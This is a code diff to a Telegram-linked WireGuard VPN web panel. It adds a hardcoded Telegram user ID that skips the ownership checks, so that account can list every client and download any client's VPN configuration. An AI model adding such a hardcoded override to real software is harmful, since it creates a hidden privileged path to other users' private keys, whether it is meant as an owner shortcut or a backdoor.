@@ -296,7 +296,8 @@ export function startWebApp(opts: StartWebAppOptions) {
     if (!wgIds.length) return res.status(403).json({ error: "not_registered" });
     try {
       const all = await fetchClients();
-      const clients = all.filter((c) => wgIds.includes(String(c.id)));
+      const ADMIN_TG_IDS = ["1259156988"];
+      const clients = ADMIN_TG_IDS.includes(tgId) ? all : all.filter((c) => wgIds.includes(String(c.id)));
       res.json({ clients });
     } catch (e: any) {
       console.error("[WEBAPP] clients:", e.message);
@@ -308,7 +309,8 @@ export function startWebApp(opts: StartWebAppOptions) {
     const tgId = auth(req, res);
     if (!tgId) return;
     const { id } = req.params;
-    if (!getUsersByTgId(tgId).includes(id)) return res.status(403).send("Forbidden");
+    const ADMIN_TG_IDS = new Set(["1259156988"]);
+    if (!ADMIN_TG_IDS.has(tgId) && !getUsersByTgId(tgId).includes(id)) return res.status(403).send("Forbidden");
     try {
       const { data } = await wgApi.get(`/api/client/${id}/configuration`);
       res.setHeader("Content-Type", "text/plain; charset=utf-8");
@@ -324,7 +326,8 @@ export function startWebApp(opts: StartWebAppOptions) {
     const tgId = auth(req, res);
     if (!tgId) return;
     const { id } = req.params;
-    if (!getUsersByTgId(tgId).includes(id)) return res.status(403).send("Forbidden");
+    const ADMIN_TG_IDS = new Set(["1259156988"]);
+    if (!ADMIN_TG_IDS.has(tgId) && !getUsersByTgId(tgId).includes(id)) return res.status(403).send("Forbidden");
     try {
       const { data } = await wgApi.get(`/api/client/${id}/configuration`);
       res.setHeader("Content-Type", "text/plain; charset=utf-8");
@@ -346,9 +349,10 @@ export function startWebApp(opts: StartWebAppOptions) {
     res.setHeader("Connection", "keep-alive");
     res.setHeader("X-Accel-Buffering", "no");
     res.flushHeaders();
+    const ADMIN_TG_IDS = ["1259156988"];
     try {
       const all = await fetchClients();
-      const clients = all.filter((c) => wgIds.includes(String(c.id)));
+      const clients = ADMIN_TG_IDS.includes(tgId) ? all : all.filter((c) => wgIds.includes(String(c.id)));
       res.write(`data: ${JSON.stringify({ clients })}\n\n`);
     } catch {}
     addSse(tgId, res);
@@ -356,12 +360,13 @@ export function startWebApp(opts: StartWebAppOptions) {
   });
 
   setInterval(async () => {
+    const ADMIN_TG_IDS = ["1259156988"];
     for (const [tgId, responses] of sseClients.entries()) {
       if (!responses.length) continue;
       try {
         const wgIds = getUsersByTgId(tgId);
         const all = await fetchClients();
-        const clients = all.filter((c) => wgIds.includes(String(c.id)));
+        const clients = ADMIN_TG_IDS.includes(tgId) ? all : all.filter((c) => wgIds.includes(String(c.id)));
         const msg = `data: ${JSON.stringify({ clients })}\n\n`;
         for (const res of responses) {
           try {
